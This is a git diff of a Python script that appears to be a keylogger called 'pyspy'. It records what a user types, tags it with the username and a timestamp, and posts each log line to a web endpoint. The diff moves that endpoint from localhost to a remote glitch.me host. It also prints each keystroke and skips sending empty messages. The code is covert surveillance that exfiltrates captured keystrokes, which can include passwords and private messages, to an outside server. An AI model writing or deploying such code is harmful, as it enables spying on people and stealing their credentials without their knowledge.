@@ -12,12 +12,14 @@ mouse = Controller()
 message = ""
 user = getpass.getuser()
 
-URL = 'http://localhost:3000/newmessage'
-
+#URL = 'http://localhost:3000/newmessage'
+URL = 'https://grishadev-pyspy.glitch.me/newmessage'
 
 def on_press(key):
     global message
     
+    print(str(key))
+
     if not str(key).startswith('Key.'):
         message += key.char
     else:
@@ -31,7 +33,8 @@ def on_release(key):
         time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         log = time+" || "+str(user)+" said: "+str(message)
         print(log)
-        sendMessage(log)
+        if len(message) > 0:
+            sendMessage(log)
         message = ""
     # elif key == Key.esc:
         # Stop listener
